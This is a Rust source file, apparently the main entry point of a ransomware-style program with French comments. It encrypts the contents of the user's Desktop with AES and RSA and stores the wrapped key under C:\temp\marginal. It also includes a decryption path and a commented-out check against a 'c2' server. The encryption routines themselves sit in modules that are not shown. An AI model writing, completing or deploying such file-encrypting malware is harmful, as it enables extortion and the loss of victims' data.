use std::path::{Path, PathBuf};

use utils::get_user_paths;

mod aes;
mod constants;
mod file;
mod simple_rsa;
mod utils;
mod version;

#[tokio::main]
async fn main() {
    // Vérifiez d'abord si les fichiers sont chiffrés
    let encrypted_key_exists = Path::new("C:\\temp\\marginal\\encrypted_aes_key").exists();

    if encrypted_key_exists {
        println!("Tentative de déchiffrement...");
        main_decrypt().await;
    } else {
        println!("Aucune clé de chiffrement trouvée. Lancement du chiffrement...");
        main_encrypt().await;
    }
}

async fn main_encrypt() {
    // let good_version = version::check_version().await;
    // if !good_version {
    //     println!("Le c2 n'est pas à jour !");
    //     std::process::exit(1);
    // }

    let paths = match get_user_paths() {
        Ok(data) => data,
        Err(e) => {
            println!("Erreur: {:?}", e);
            std::process::exit(0);
        }
    };

    if is_already_encrypted().await {
        println!("Les fichiers sont déjà chiffrés ! Impossible de les chiffrer à nouveau.");
        std::process::exit(1);
    }

    let target_dir = paths.desktop.as_str();

    // let target_dir = match Path::new(paths.desktop.as_str())
    //     .join("appart2")
    //     .into_os_string()
    //     .into_string()
    // {
    //     Ok(data) => data,
    //     Err(err) => {
    //         println!("Error target dir");
    //         std::process::exit(1);
    //     }
    // };
    match utils::setup_encryption(&target_dir).await {
        Ok(_) => println!("Chiffrement terminé avec succès"),
        Err(err) => {
            println!("Erreur lors du chiffrement: {:?}", err);
            std::process::exit(1);
        }
    }

    std::process::exit(0);
}

async fn is_already_encrypted() -> bool {
    let paths = match get_user_paths() {
        Ok(data) => data,
        Err(e) => {
            println!("Erreur: {:?}", e);
            std::process::exit(0);
        }
    };
    let key_dir = Path::new(&paths.temp_marginal);
    let encrypted_aes_key_file = key_dir.join("encrypted_aes_key");

    encrypted_aes_key_file.exists()
}

async fn main_decrypt() {
    let paths = match get_user_paths() {
        Ok(data) => data,
        Err(e) => {
            println!("Erreur: {:?}", e);
            std::process::exit(0);
        }
    };

    let target_dir = paths.desktop.as_str();
    // let target_dir = match Path::new(paths.desktop.as_str())
    //     .join("appart2")
    //     .into_os_string()
    //     .into_string()
    // {
    //     Ok(data) => data,
    //     Err(err) => {
    //         println!("Error target dir");
    //         std::process::exit(1);
    //     }
    // };

    println!("{:?}", target_dir);
    match utils::get_private_key_from_path(paths.get_private_key_path()) {
        Ok(private_key) => {
            utils::decrypt_with_private_key(&private_key, Some(&target_dir))
                .await
                .unwrap();
        }
        Err(e) => println!("Erreur: {:?}", e),
    }
}
